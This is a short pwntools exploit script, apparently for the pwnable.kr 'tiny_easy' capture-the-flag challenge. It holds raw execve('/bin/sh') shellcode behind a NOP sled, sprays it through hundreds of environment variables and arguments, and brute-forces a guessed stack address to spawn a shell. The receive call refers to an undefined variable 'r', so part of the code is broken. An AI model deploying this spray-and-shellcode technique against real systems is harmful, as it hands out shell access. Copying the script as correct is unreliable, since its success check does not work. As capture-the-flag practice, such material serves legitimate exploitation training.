from pwn import *
#context.log_level='debug'

s = ssh('tiny_easy','pwnable.kr',port=2222,password='guest')

payload = b'\x90'*0x100 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

_env = {}
_argv = [b'\xff\xff\xdf\xff']

for i in range(0x100):
	_env[str(i)] = payload
	_argv.append(payload)

for i in range(0x100):
	n = s.process(executable='./tiny_easy',argv=_argv,env=_env)
	try:
		n.sendline('cat flag')
		r.recv(100)
	except:
		print('sorry..')
		continue
	n.interactive()

